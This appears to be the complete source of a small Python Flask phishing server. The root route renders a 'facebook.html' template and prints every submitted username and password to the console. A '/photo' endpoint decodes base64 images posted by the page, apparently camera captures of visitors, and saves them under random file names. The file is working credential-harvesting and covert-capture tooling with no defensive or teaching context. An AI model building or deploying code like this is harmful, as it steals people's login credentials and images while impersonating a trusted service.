from flask import Flask, render_template, request, redirect
import base64
import string
import random


app = Flask(__name__)


@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == 'POST':
        username = request.form["username"]
        password = request.form["password"]
        print(username, password)
    return render_template('facebook.html')


item = 0

@app.route('/photo', methods=['POST'])
def upload_picture():
    try:
        data = request.json
        image_data = data.get('image', '')
        
       
        random_username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) + '.jpg'

        image_filename = (random_username)
        
        
        image_binary = base64.b64decode(image_data.split(',')[1])

        with open(image_filename, 'wb') as image_file:
            image_file.write(image_binary)

        return 'Image saved successfully!'
    except Exception as e:
        return f'Error saving image: {str(e)}'
    
if __name__ == "__main__":
    app.run(debug=True, port=8000)